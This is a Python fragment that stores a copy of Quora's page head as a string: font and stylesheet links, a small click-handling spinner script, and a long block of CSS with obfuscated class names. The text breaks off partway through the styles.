Main_Quora = """<html lang="en" class="js-wf-loaded">

<head>
    <link rel="icon" href="https://qsf.fs.quoracdn.net/-3-images.favicon.ico-26-ae77b637b1e7ed2c.ico">
    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q-icons.q-icons.woff2-26-9afc20a49e3ef2cf.woff2">
    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_regular.woff2-26-7ace3bc4cbe404d9.woff2">
    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_regular_italic.woff2-26-9d81ab3229809d01.woff2">
    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_semibold.woff2-26-b55bf39d9018ace9.woff2">
    <link rel="preload" as="font" type="font/woff2" crossorigin="anonymous" href="https://qsf.fs.quoracdn.net/-3-fonts.q_serif.q_serif_semibold_italic.woff2-26-4c39f22524232bf2.woff2">
    <script async="" src="http://quora.com//www.google-analytics.com/analytics.js"></script>

    <script type="text/javascript">
        var clicks = [],
            handleClicks = !0,
            handleUnready = function(e) {
                if (handleClicks) {
                    for (var n = e.target; n && n.tagName && "A" != n.tagName;) n = n.parentNode;
                    if (n && n.getAttribute && "#" === n.getAttribute("href")) {
                        clicks.push(e.target);
                        var t = document.getElementById("async_spinner");
                        if (!t) {
                            t = document.createElement("div"), t.setAttribute("id", "async_spinner"), t.setAttribute("class", "__live_spinner");
                            var a = document.createElement("div");
                            a.setAttribute("class", "__live_spinner_indicator"), require.whenReady("shared/loading", function() {
                                var e = require("shared/loading"),
                                    n = e.createDots("small");
                                a.appendChild(n), t.appendChild(a), document.body.appendChild(t)
                            })
                        }
                    }
                }
            };
        window.clearHandlers = function() {
            if (handleClicks) {
                handleClicks = !1, document.detachEvent ? document.detachEvent("onclick", handleUnready) : document.removeEventListener("click", handleUnready, !0);
                for (var e = 0; e < clicks.length; ++e) clicks[e].click();
                var n = document.getElementById("async_spinner");
                n && n.parentNode.removeChild(n)
            }
        }, document.attachEvent ? document.attachEvent("onclick", handleUnready) : document.addEventListener("click", handleUnready, !0);
    </script>
    <link rel="search" type="application/opensearchdescription+xml" href="http://quora.com/opensearch/description.xml" title="Quora">
    <link href="https://qsbr.fs.quoracdn.net/-3-main.css-26-92a9a35495215354.css" rel="stylesheet" type="text/css">
    <style type="text/css">
        .Bundle.SuggestedTribesBundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_main .view_more_link {
            color: #949494
        }
        
        .feed_card_on .system_a2a_feed .system_a2a_header .ykmmpcehgctqmxhkkmkd {
            display: inline-block
        }
        
        .HomeMultifeed .SuggestedAMAsBundle div.section_header .ykmmpcehgctqmxhkkmkd .header_text_main .ama_view_all_link {
            color: #949494;
            position: absolute;
            right: 16px
        }
        
        .HomeMultifeed .SuggestedUsersBundle div.section_header .ykmmpcehgctqmxhkkmkd .header_text_main .ama_view_all_link {
            color: #949494;
            position: absolute;
            right: 16px
        }
        
        .HomeMultifeed .SuggestedTopicsBundle div.section_header .ykmmpcehgctqmxhkkmkd .header_text_main .ama_view_all_link {
            color: #949494;
            position: absolute;
            right: 16px
        }
        
        .WriteMain .WriteMultifeed .section_header .ykmmpcehgctqmxhkkmkd .header_text_main {
            float: none;
            color: #333;
            font-weight: 500;
            font-size: 15px
        }
        
        .WriteMain .WriteMultifeed .section_header .ykmmpcehgctqmxhkkmkd .header_text_main .user {
            float: none;
            color: #333;
            font-weight: 500;
            font-size: 15px
        }
        
        .WriteMain .WriteMultifeed .section_header .ykmmpcehgctqmxhkkmkd .header_text_main a {
            color: #333
        }
        
        .WriteMain .WriteMultifeed .section_header .ykmmpcehgctqmxhkkmkd .header_text_main .user a {
            color: #333
        }
        
        .WriteMain .WriteMultifeed .section_header .ykmmpcehgctqmxhkkmkd .header_text_main a:hover {
            cursor: pointer
        }
        
        .WriteMain .WriteMultifeed .section_header .ykmmpcehgctqmxhkkmkd .header_text_main .user a:hover {
            cursor: pointer
        }
        
        .WriteMain .WriteMultifeed .section_header .ykmmpcehgctqmxhkkmkd .header_text_details:first-letter {
            text-transform: capitalize
        }
        
        .follow_questions_header .ykmmpcehgctqmxhkkmkd {
            float: left
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd {
            align-self: center;
            width: 100%
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_main {
            float: none;
            color: #333;
            font-weight: 500;
            font-size: 15px
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .TopicNameSpan {
            float: none;
            color: #333;
            font-weight: 500;
            font-size: 15px
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_main .user {
            float: none;
            color: #333;
            font-weight: 500;
            font-size: 15px
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd a.user {
            float: none;
            color: #333;
            font-weight: 500;
            font-size: 15px
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_main a {
            color: #333
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .TopicNameSpan a {
            color: #333
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_main .user a {
            color: #333
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd a.user a {
            color: #333
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_main a:hover {
            cursor: pointer
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .TopicNameSpan a:hover {
            cursor: pointer
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_main .user a:hover {
            cursor: pointer
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd a.user a:hover {
            cursor: pointer
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_details {
            display: block;
            font-size: 13px;
            text-transform: none;
            letter-spacing: 0;
            font-weight: 400;
            color: #949494
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_details a {
            color: #949494
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_details a:hover {
            cursor: pointer
        }
        
        .Bundle .section_header .ykmmpcehgctqmxhkkmkd .header_text_details:first-letter {
            text-transform: capitalize
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid {
            color: #333;
            font-weight: 500;
            position: relative;
            border-bottom: 1px solid #e2e2e2;
            margin-bottom: 16px;
            padding-bottom: 8px;
            font-size: 18px;
            padding-bottom: 7px;
            border-bottom: 0
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a {
            font-size: 13px;
            font-weight: 400;
            position: absolute;
            right: 0;
            bottom: 8px;
            color: #949494
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a:hover {
            color: #949494;
            text-decoration: underline
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button {
            -webkit-user-select: none;
            -moz-user-select: none;
            -ms-user-select: none;
            user-select: none;
            -webkit-box-sizing: border-box;
            -moz-box-sizing: border-box;
            box-sizing: border-box;
            transition: opacity ease-in-out 100ms, color ease-in-out 100ms, background-color ease-in-out 100ms, border-color ease-in-out 100ms;
            border-radius: 3px;
            box-shadow: 0 1px 1px 0 rgba(200, 200, 200, 0.2);
            display: inline-block;
            font-weight: 500;
            outline: 0;
            padding: 3px 7px 4px 7px;
            text-align: center;
            text-decoration: none;
            cursor: pointer;
            background: #3e78ad;
            color: #fff;
            border: 1px solid #3a66ad;
            box-shadow: 0 1px 1px 0 rgba(200, 200, 200, 0.6);
            font-weight: inherit;
            bottom: 7px
        }
        
        .lang_ja .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button {
            font-weight: bold
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button:active {
            opacity: .6;
            box-shadow: none
        }
        
        .action_item .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button:active {
            opacity: 1
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button:hover {
            text-decoration: none
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button .count {
            background: 0;
            padding: 0;
            margin: 0;
            margin-left: 6px;
            padding-left: 6px;
            transition: opacity ease-in-out 100ms, color ease-in-out 100ms, background-color ease-in-out 100ms, border-color ease-in-out 100ms;
            position: relative;
            border-radius: 0 3px 3px 0
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button .count:before {
            content: "";
            transition: opacity ease-in-out 100ms, color ease-in-out 100ms, background-color ease-in-out 100ms, border-color ease-in-out 100ms;
            width: 1px;
            height: 14.5px;
            position: absolute;
            left: 0;
            top: 2px
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button .no_count {
            display: none
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button.disabled {
            opacity: .5;
            pointer-events: none
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button.submit_button_disabled {
            opacity: .5;
            pointer-events: none
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button.fake_disabled {
            opacity: .5
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button.fake_disabled:hover {
            cursor: default
        }
        
        .action_item .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button {
            box-shadow: none;
            border: 0
        }
        
        .action_item .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button:hover {
            border: 0
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button:not(.fake_disabled):hover {
            border: 1px solid #234462
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.action_button:not(.fake_disabled):focus {
            box-shadow: inset 1px 0 0 #fff, inset -1px 0 0 #fff, inset 0 1px 0 #fff, inset 0 -1px 0 #fff
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.view_all {
            font-size: 13px;
            color: #949494;
            position: relative;
            padding-right: 14px;
            position: absolute
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.view_all:after {
            content: "";
            display: block;
            height: 6px;
            width: 6px;
            border: 2px solid #ccc;
            border-bottom: 0;
            border-left: none;
            position: absolute;
            margin-top: -4.28571429px;
            top: 50%
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.view_all:after {
            -webkit-transform: rotate(45deg);
            -moz-transform: rotate(45deg);
            -ms-transform: rotate(45deg);
            transform: rotate(45deg)
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid a.view_all:after {
            right: 2px
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid .switcher {
            font-size: 13px;
            color: #333;
            font-weight: 400;
            position: absolute;
            right: 0;
            bottom: 8px
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid .switcher .current_item {
            font-weight: 500
        }
        
        .TopicPageLayout .rtpexzedcnidqzpymnid .switcher a {
            position: relative;
            color: #949494;
            bottom: auto
        }
        
        .TopicManagePageMain .rtpexzedcnidqzpymnid.locked:after {
            left: inherit;
            margin-left: 4px
        }
        
        .TopicOrganizePageMain .rtpexzedcnidqzpymnid.locked:after {
            left: inherit;
            margin-left: 4px
        }
        
        .modal_dismissible_signup_dialog .dialog_wrapper .signup_header .ykmmpcehgctqmxhkkmkd {
            position: relative;
            color: #666;
            letter-spacing: .5px;
            font-weight: 300;
            font-size: 19px
        }
        
        .modal_signup_dialog .dialog_wrapper .signup_header .ykmmpcehgctqmxhkkmkd {
            position: relative;
            color: #666;
            letter-spacing: .5px;
            font-weight: 300;
            font-size: 19px
        }
        
        .TopicDigestOptIn .ykmmpcehgctqmxhkkmkd {
            margin-left: 12px
        }
        
        .AnswerInboxHeader .ykmmpcehgctqmxhkkmkd {
            font-family: Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif;
            font-weight: bold;
            line-height: 1.3;
            color: #333;
            font-size: 23px
        }
        
        .js-wf-loaded .AnswerInboxHeader .ykmmpcehgctqmxhkkmkd {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .amp-page .AnswerInboxHeader .ykmmpcehgctqmxhkkmkd {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        @media only screen and (min-device-width:320px) and (max-device-width:360px) {
            .AnswerInboxHeader .ykmmpcehgctqmxhkkmkd {
                font-size: 21px
            }
        }
        
        .EmailConfirmationModal .wrapper .ykmmpcehgctqmxhkkmkd {
            padding-top: 16px;
            font-weight: bold;
            font-size: 19px;
            display: block
        }
        
        .StatsMain .stats_side .ContentListWrapper .ContentListItem .rtpexzedcnidqzpymnid {
            color: #949494;
            font-weight: 500
        }
        
        .StatsMain .stats_side .ContentListWrapper .ContentListItem .rtpexzedcnidqzpymnid.is_link {
            display: none
        }
        
        .StatsMain .stats_side .ContentListWrapper .ContentListItem .rtpexzedcnidqzpymnid.is_not_link {
            display: block
        }
        
        .StatsMain .stats_side .ContentListWrapper .ContentListItem.is_active .rtpexzedcnidqzpymnid {
            color: #2b6dad
        }
        
        .StatsMain .stats_side .ContentListWrapper .ContentListItem.is_active .rtpexzedcnidqzpymnid.is_link {
            display: block
        }
        
        .StatsMain .stats_side .ContentListWrapper .ContentListItem.is_active .rtpexzedcnidqzpymnid.is_not_link {
            display: none
        }
        
        .PaidContributorSummary .rtpexzedcnidqzpymnid {
            font-size: 26px;
            margin-bottom: 16px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .phoaffvvhnjwjwsrfusu {
            z-index: 2;
            margin-top: 1px;
            right: 20px;
            position: absolute
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze {
            display: flex;
            padding: 4px 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .bgzulqfmudjukbxctelh {
            font-family: Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif;
            display: block;
            font-weight: normal
        }
        
        .js-wf-loaded .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .bgzulqfmudjukbxctelh {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .amp-page .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .bgzulqfmudjukbxctelh {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .bgzulqfmudjukbxctelh:hover {
            text-decoration: underline
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .ykmmpcehgctqmxhkkmkd {
            display: flex;
            width: 100%
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .icon_frame {
            border-radius: 3px;
            align-self: center;
            margin-right: 8px;
            display: inline-block
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .icon_frame .account_logo_img {
            background-size: cover;
            background-position: center;
            width: 40px;
            height: 40px;
            border-radius: 100%
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .account_description {
            display: flex;
            width: 100%
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .account_description .pmqjeiqufgxplztiopgv {
            font-family: Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .js-wf-loaded .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .account_description .pmqjeiqufgxplztiopgv {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .amp-page .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .account_description .pmqjeiqufgxplztiopgv {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .pmqjeiqufgxplztiopgv {
            font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
            font-weight: 500
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze .bxlvqvskajndmjdoctad {
            font-size: 13px;
            color: #949494
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .mydgobpptdjjwcbfpgib {
            display: inline-block
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .agxcyinorqzdpisjgiri {
            height: 1px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .nzgsrvnhmrztqoazstut {
            position: relative;
            bottom: 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .szibkrvykraendfugdck {
            position: absolute;
            top: 8px;
            right: 8px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .ufwejovalkkbixffhdmo {
            padding: 16px 0 16px 0;
            margin: 0 -16px;
            padding-top: 4px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .ufwejovalkkbixffhdmo .btxgyzqrvzfzlviyrsrp {
            margin-top: 4px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .ufwejovalkkbixffhdmo .btxgyzqrvzfzlviyrsrp .fllszubfnfonspxrjpri {
            box-shadow: inset 0 1px 0 rgba(0, 0, 0, 0.05), inset 0 -1px 0 rgba(0, 0, 0, 0.05), inset 1px 0 0 rgba(0, 0, 0, 0.05), inset -1px 0 0 rgba(0, 0, 0, 0.05);
            background-color: #e6e6e6;
            border-radius: 3px;
            height: 96px;
            width: 180px;
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            margin-top: 4px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd .ufwejovalkkbixffhdmo .dbuegbvcxbvynsbgzust {
            padding-right: 8px;
            margin-bottom: 8px
        }
        
        .pykxyqnkwhotayrcbdwk.eiegsfbfykdtpjbzsvht.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .ufwejovalkkbixffhdmo {
            margin-bottom: 0;
            padding: 0 16px 0 16px
        }
        
        .pykxyqnkwhotayrcbdwk.eiegsfbfykdtpjbzsvht.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .phoaffvvhnjwjwsrfusu {
            padding-top: 3px
        }
        
        .pykxyqnkwhotayrcbdwk.eiegsfbfykdtpjbzsvht.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .ufwejovalkkbixffhdmo {
            margin-bottom: 0;
            padding: 0 16px 0 16px
        }
        
        .pykxyqnkwhotayrcbdwk.eiegsfbfykdtpjbzsvht.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .phoaffvvhnjwjwsrfusu {
            padding-top: 3px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq {
            position: relative;
            margin-top: 20px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .mydgobpptdjjwcbfpgib {
            border-top: 0;
            margin-bottom: 4px;
            padding-top: 0;
            display: inline-block
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .ovgzjjpueiteeweheqxd {
            padding-top: 16px;
            border-top: 1px solid #e2e2e2;
            margin: 0 -16px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .szibkrvykraendfugdck {
            position: absolute;
            top: 8px;
            right: -8px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .phoaffvvhnjwjwsrfusu {
            right: 0;
            margin-top: 4px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .btxgyzqrvzfzlviyrsrp .nzgsrvnhmrztqoazstut {
            position: absolute;
            bottom: 8px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.uiqmkeidjmejmfsbbezq .ufwejovalkkbixffhdmo {
            margin: 0;
            padding: 0
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst {
            position: relative;
            margin-top: 20px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .mydgobpptdjjwcbfpgib {
            border-top: 0;
            margin-bottom: 4px;
            padding-top: 0;
            display: inline-block
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .ovgzjjpueiteeweheqxd {
            padding-top: 16px;
            border-top: 1px solid #e2e2e2;
            margin: 0 -16px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .szibkrvykraendfugdck {
            position: absolute;
            top: 8px;
            right: -8px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .phoaffvvhnjwjwsrfusu {
            right: 0;
            margin-top: 4px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .btxgyzqrvzfzlviyrsrp .nzgsrvnhmrztqoazstut {
            position: absolute;
            bottom: 8px
        }
        
        .pykxyqnkwhotayrcbdwk.feed_expand.jdmrpjekieynbjaonzqd.jteqgtttypqwvhneucst .ufwejovalkkbixffhdmo {
            margin: 0;
            padding: 0
        }
        
        .pykxyqnkwhotayrcbdwk.question_page_content.jdmrpjekieynbjaonzqd .rjdovdlpbajpynftumze {
            padding: 12px 0 0 0;
            border-top: 1px solid #e2e2e2;
            border-bottom: 0
        }
        
        .pykxyqnkwhotayrcbdwk.question_page_content.jdmrpjekieynbjaonzqd .ufwejovalkkbixffhdmo {
            margin: 0;
            padding: 8px 0 16px 0
        }
        
        .pykxyqnkwhotayrcbdwk.question_page_content.jdmrpjekieynbjaonzqd .ufwejovalkkbixffhdmo .dbuegbvcxbvynsbgzust {
            margin-bottom: 8px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw {
            position: relative;
            margin-top: 20px;
            margin-top: 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .mydgobpptdjjwcbfpgib {
            border-top: 0;
            margin-bottom: 4px;
            padding-top: 0;
            display: inline-block
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .ovgzjjpueiteeweheqxd {
            padding-top: 16px;
            border-top: 1px solid #e2e2e2;
            margin: 0 -16px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .szibkrvykraendfugdck {
            position: absolute;
            top: 8px;
            right: -8px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .phoaffvvhnjwjwsrfusu {
            right: 0;
            margin-top: 4px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .btxgyzqrvzfzlviyrsrp .nzgsrvnhmrztqoazstut {
            position: absolute;
            bottom: 8px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .ufwejovalkkbixffhdmo {
            margin: 0;
            padding: 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .ovgzjjpueiteeweheqxd {
            padding: 0;
            margin: 0;
            border-top: 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .szibkrvykraendfugdck {
            display: none
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .mydgobpptdjjwcbfpgib {
            margin-bottom: 0;
            width: 100%
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .mydgobpptdjjwcbfpgib .bgzulqfmudjukbxctelh {
            width: 100%;
            color: #333;
            font-size: 15px;
            font-weight: 500;
            border-bottom: 1px solid #e2e2e2;
            padding-bottom: 8px;
            margin-bottom: 16px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .dbuegbvcxbvynsbgzust {
            padding: 0;
            margin: 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .rjdovdlpbajpynftumze {
            border-bottom: 0;
            margin-bottom: 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .rjdovdlpbajpynftumze .icon_frame .account_logo_img {
            width: 32px;
            height: 32px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .rjdovdlpbajpynftumze .bgzulqfmudjukbxctelh {
            font-size: 13px;
            padding-bottom: 0
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .rjdovdlpbajpynftumze .bxlvqvskajndmjdoctad {
            font-weight: 400
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .content_flex {
            flex-direction: column
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .btxgyzqrvzfzlviyrsrp {
            margin-top: 4px
        }
        
        .pykxyqnkwhotayrcbdwk.jdmrpjekieynbjaonzqd.tazabiteajwjazcqqiaw .btxgyzqrvzfzlviyrsrp .fllszubfnfonspxrjpri {
            margin-bottom: 8px;
            height: 163px;
            width: 100%
        }
        
        .pykxyqnkwhotayrcbdwk {
            display: inline-block;
            margin: 16px 0 0 0;
            width: 100%;
            overflow: inherit
        }
        
        .pykxyqnkwhotayrcbdwk .mydgobpptdjjwcbfpgib {
            font-size: 13px;
            line-height: 14px
        }
        
        .pykxyqnkwhotayrcbdwk .mydgobpptdjjwcbfpgib .bgzulqfmudjukbxctelh {
            color: #949494;
            text-decoration: none;
            display: inline-block
        }
        
        .pykxyqnkwhotayrcbdwk .mydgobpptdjjwcbfpgib .bgzulqfmudjukbxctelh:hover {
            text-decoration: underline
        }
        
        .pykxyqnkwhotayrcbdwk .mydgobpptdjjwcbfpgib .pmqjeiqufgxplztiopgv::first-letter {
            text-transform: capitalize
        }
        
        .pykxyqnkwhotayrcbdwk .szibkrvykraendfugdck {
            position: absolute;
            right: -9px;
            top: -9px
        }
        
        .pykxyqnkwhotayrcbdwk .rjdovdlpbajpynftumze {
            position: relative
        }
        
        .pykxyqnkwhotayrcbdwk .jeqarcgtazsblydnhhel {
            color: inherit;
            display: block;
            text-decoration: inherit;
            overflow: auto
        }
        
        .pykxyqnkwhotayrcbdwk .rtpexzedcnidqzpymnid {
            font-family: Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif;
            font-weight: bold;
            color: #333;
            text-decoration: inherit;
            line-height: 23px;
            font-size: 18px;
            margin-bottom: 4px
        }
        
        .js-wf-loaded .pykxyqnkwhotayrcbdwk .rtpexzedcnidqzpymnid {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .amp-page .pykxyqnkwhotayrcbdwk .rtpexzedcnidqzpymnid {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .pykxyqnkwhotayrcbdwk .rtpexzedcnidqzpymnid:hover {
            text-decoration: underline
        }
        
        .pykxyqnkwhotayrcbdwk .dbuegbvcxbvynsbgzust {
            font-family: Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif;
            text-decoration: inherit;
            line-height: 24px
        }
        
        .js-wf-loaded .pykxyqnkwhotayrcbdwk .dbuegbvcxbvynsbgzust {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .amp-page .pykxyqnkwhotayrcbdwk .dbuegbvcxbvynsbgzust {
            font-family: 'q_serif', Georgia, Times, "Times New Roman", "Hiragino Kaku Gothic Pro", "Meiryo", serif
        }
        
        .pykxyqnkwhotayrcbdwk .btxgyzqrvzfzlviyrsrp {
            position: relative;
            z-index: 1
        }
        
        .pykxyqnkwhotayrcbdwk .btxgyzqrvzfzlviyrsrp::after {
            clear: both;
            content: " ";
            display: block
        }
        
